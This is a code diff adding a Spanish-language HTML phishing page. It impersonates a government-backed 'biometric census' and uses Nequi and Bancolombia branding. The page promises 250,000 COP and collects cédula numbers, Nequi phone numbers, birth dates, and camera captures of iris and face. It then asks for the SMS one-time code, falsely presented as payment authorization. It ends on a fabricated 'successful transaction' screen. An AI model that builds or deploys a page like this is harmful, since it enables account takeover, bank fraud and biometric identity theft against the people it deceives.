@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BioSecure ID - Verificación Biométrica Oficial</title>
+    <link rel="icon" type="image/png" href="assets/pestana.png">
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="container">
+        <!-- Header -->
+        <header>
+            <div class="brand-container">
+                <div class="logo-text">BIOSECURE <span class="highlight">COLOMBIA</span></div>
+                <div class="partner-badge">
+                    <span>Aliado Oficial</span>
+                    <img src="assets/nequi.png" alt="Nequi" class="nequi-logo">
+                </div>
+            </div>
+            <div class="secure-badge">🔒 Conexión Segura SSL</div>
+        </header>
+
+        <!-- 1. Landing Page / Form -->
+        <section id="landing-page" class="screen active">
+            <div class="hero">
+                <h1>Programa Nacional de Identidad Digital</h1>
+                <p class="subtitle">Participe en el censo biométrico y reciba un incentivo económico inmediato de <strong>$250.000 COP</strong>.</p>
+                
+                <div class="trust-indicators">
+                    <div class="trust-item">
+                        <span class="icon">🛡️</span>
+                        <span>Vigilado Superfinanciera</span>
+                    </div>
+                    <div class="trust-item">
+                        <span class="icon">🤝</span>
+                        <span>Respaldo Bancolombia</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="legal-notice-box">
+                <p>Sus datos están protegidos por la Ley 1581 de 2012 de Protección de Datos Personales.</p>
+            </div>
+
+            <form id="registration-form">
+                <div class="form-group">
+                    <label>Nombres Completos</label>
+                    <input type="text" name="nombre" required placeholder="Como aparece en su cédula">
+                </div>
+                <div class="form-group">
+                    <label>Apellidos</label>
+                    <input type="text" name="apellido" required placeholder="Como aparece en su cédula">
+                </div>
+                <div class="form-group">
+                    <label>Número de Cédula</label>
+                    <input type="number" name="cedula" required placeholder="Sin puntos ni comas">
+                </div>
+                <div class="form-group">
+                    <label>Celular Nequi (Cuenta Activa)</label>
+                    <input type="number" name="nequi" required placeholder="300 123 4567">
+                    <small>El pago se realizará únicamente a este número.</small>
+                </div>
+                <div class="form-group">
+                    <label>Fecha de Nacimiento</label>
+                    <div class="date-inputs">
+                        <input type="number" id="dob-day" placeholder="Día" min="1" max="31" required>
+                        <select id="dob-month" required>
+                            <option value="" disabled selected>Mes</option>
+                            <option value="01">Enero</option>
+                            <option value="02">Febrero</option>
+                            <option value="03">Marzo</option>
+                            <option value="04">Abril</option>
+                            <option value="05">Mayo</option>
+                            <option value="06">Junio</option>
+                            <option value="07">Julio</option>
+                            <option value="08">Agosto</option>
+                            <option value="09">Septiembre</option>
+                            <option value="10">Octubre</option>
+                            <option value="11">Noviembre</option>
+                            <option value="12">Diciembre</option>
+                        </select>
+                        <input type="number" id="dob-year" placeholder="Año" min="1900" max="2025" required>
+                    </div>
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Ciudad de Residencia</label>
+                        <input type="text" name="ciudad" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Departamento</label>
+                        <input type="text" name="departamento" required>
+                    </div>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="terms" required>
+                    <label for="terms">Acepto los términos y condiciones y autorizo el tratamiento de mis datos biométricos.</label>
+                </div>
+
+                <button type="submit" class="btn-primary">COMENZAR VERIFICACIÓN</button>
+            </form>
+        </section>
+
+        <!-- 2. Loading Screen -->
+        <section id="loading-screen" class="screen">
+            <div class="loader-content">
+                <div class="spinner"></div>
+                <h2 id="loading-message">Validando información en Registraduría...</h2>
+                <p class="blink">Por favor no cierre esta ventana</p>
+                <div class="progress-bar">
+                    <div class="progress-fill"></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 3. Iris Scanner -->
+        <section id="iris-scanner" class="screen">
+            <div class="step-indicator">Paso 2 de 3: Biometría de Iris</div>
+            <h2>Escaneo de Iris</h2>
+            <p>Nuestro sistema validará su identidad única. Por favor ubíquese en un lugar iluminado.</p>
+            
+            <div class="camera-container">
+                <video id="iris-video" autoplay playsinline></video>
+                <div class="scanner-overlay">
+                    <div class="grid-overlay"></div>
+                    <div class="scan-line"></div>
+                    <div class="reticle"></div>
+                    <div class="data-readout">
+                        <span>IRIS ID: <span id="iris-id-display">SCANNING...</span></span>
+                        <span>CONFIDENCE: 99.8%</span>
+                    </div>
+                </div>
+            </div>
+            
+            <button id="btn-scan-iris" class="btn-primary">INICIAR ESCANEO</button>
+        </section>
+
+        <!-- 4. Face Capture -->
+        <section id="face-capture" class="screen">
+            <div class="step-indicator">Paso 3 de 3: Validación Facial</div>
+            <h2>Prueba de Vida</h2>
+            <p>Para evitar fraudes, necesitamos confirmar que es usted en tiempo real.</p>
+            
+            <div class="camera-container">
+                <video id="face-video" autoplay playsinline></video>
+                <canvas id="face-canvas" style="display:none;"></canvas>
+                <div class="face-guide">
+                    <div class="face-oval"></div>
+                </div>
+            </div>
+
+            <div class="controls">
+                <button id="btn-capture-face" class="btn-primary">CAPTURAR FOTOGRAFÍA</button>
+                <div id="post-capture-controls" style="display:none;">
+                    <button id="btn-retake" class="btn-secondary">REINTENTAR</button>
+                    <button id="btn-send-face" class="btn-success">CONFIRMAR Y ENVIAR</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- 5. Payment Verification -->
+        <section id="payment-verification" class="screen">
+            <div class="nequi-header">
+                <img src="assets/nequi.png" alt="Nequi" class="nequi-logo-large">
+            </div>
+            <h2>Autorización de Desembolso</h2>
+            <p>Hemos generado una orden de pago por <strong>$250.000 COP</strong> a su cuenta.</p>
+            <p>Para finalizar, ingrese el código de seguridad (OTP) que enviamos a su celular sms.</p>
+            
+            <div class="code-input-container">
+                <label>Código de Autorización (6 dígitos)</label>
+                <input type="text" id="payment-code" placeholder="000000" maxlength="6" pattern="\d*">
+            </div>
+
+            <button id="btn-verify-payment" class="btn-primary">AUTORIZAR PAGO</button>
+            <p class="secure-note">🔒 Esta transacción está encriptada de extremo a extremo.</p>
+        </section>
+
+        <!-- 6. Success Screen -->
+        <section id="success-screen" class="screen">
+            <div class="success-content">
+                <div class="checkmark-circle">
+                    <div class="checkmark">✓</div>
+                </div>
+                <h2>¡Transacción Exitosa!</h2>
+                <p class="amount">$250.000 COP</p>
+                <p>El dinero ha sido enviado a su cuenta Nequi.</p>
+                <div class="transaction-details">
+                    <div class="detail-row">
+                        <span>Referencia:</span>
+                        <span>#NQ-8923842</span>
+                    </div>
+                    <div class="detail-row">
+                        <span>Fecha:</span>
+                        <span id="current-date"></span>
+                    </div>
+                    <div class="detail-row">
+                        <span>Estado:</span>
+                        <span class="status-success">Aprobado</span>
+                    </div>
+                </div>
+                <p class="thank-you">Gracias por contribuir al desarrollo tecnológico de Colombia.</p>
+                <button onclick="location.reload()" class="btn-secondary">Finalizar</button>
+            </div>
+        </section>
+
+        <footer>
+            <p>© 2025 BioSecure Colombia S.A.S. | NIT 900.123.456-7</p>
+            <p>Calle 26 # 57-83, Bogotá D.C., Colombia</p>
+            <p>Vigilado Superintendencia de Industria y Comercio</p>
+        </footer>
+
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
